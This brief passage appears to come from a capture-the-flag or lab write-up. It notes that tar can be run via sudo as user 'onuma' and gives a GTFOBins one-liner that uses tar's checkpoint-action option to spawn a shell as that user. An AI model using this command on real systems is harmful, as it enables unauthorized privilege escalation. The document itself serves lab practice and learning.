![[Pasted image 20240903115318.png]]
Using this information
- Found [GTFObins](https://gtfobins.github.io/gtfobins/tar/) for tar which can be run as user `onuma`
- getting shell as `onuma`
```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
